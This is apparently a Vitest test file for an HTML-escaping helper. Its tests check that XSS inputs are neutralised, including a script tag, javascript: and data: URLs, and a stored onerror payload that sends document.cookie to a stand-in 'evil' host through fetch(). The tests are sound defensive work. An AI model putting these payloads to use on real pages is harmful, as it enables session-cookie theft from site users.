import { describe, it, expect } from 'vitest'
import { printHtml, escapeHtml, safeUrl, raw } from '../printHtml'

describe('escapeHtml', () => {
  it('escapa los metacaracteres HTML', () => {
    expect(escapeHtml('<img src=x onerror=alert(1)>')).toBe(
      '&lt;img src=x onerror=alert(1)&gt;',
    )
    expect(escapeHtml(`a&b"c'd<e>f`)).toBe('a&amp;b&quot;c&#39;d&lt;e&gt;f')
  })
  it('trata null/undefined como cadena vacía', () => {
    expect(escapeHtml(null)).toBe('')
    expect(escapeHtml(undefined)).toBe('')
  })
})

describe('printHtml', () => {
  it('escapa las interpolaciones pero deja el markup estático crudo', () => {
    const nombre = '<script>alert(1)</script>'
    const out = printHtml`<h1>${nombre}</h1>`
    expect(out).toBe('<h1>&lt;script&gt;alert(1)&lt;/script&gt;</h1>')
  })

  it('neutraliza un payload onerror almacenado', () => {
    const asistente = '<img src=x onerror=fetch(`//evil/?c=`+document.cookie)>'
    const out = printHtml`<li>${asistente}</li>`
    expect(out).not.toContain('<img')
    expect(out).toContain('&lt;img')
  })

  it('respeta raw() para HTML ya seguro', () => {
    const filas = printHtml`<td>${'<b>x</b>'}</td>`
    const out = printHtml`<tr>${raw(filas)}</tr>`
    expect(out).toBe('<tr><td>&lt;b&gt;x&lt;/b&gt;</td></tr>')
  })
})

describe('safeUrl', () => {
  it('permite http(s)/mailto/relativas', () => {
    expect(safeUrl('https://x.com/a?b=1&c=2')).toBe('https://x.com/a?b=1&amp;c=2')
    expect(safeUrl('/ruta')).toBe('/ruta')
  })
  it('neutraliza javascript: y data:', () => {
    expect(safeUrl('javascript:alert(1)')).toBe('#')
    expect(safeUrl('data:text/html,<script>')).toBe('#')
  })
})
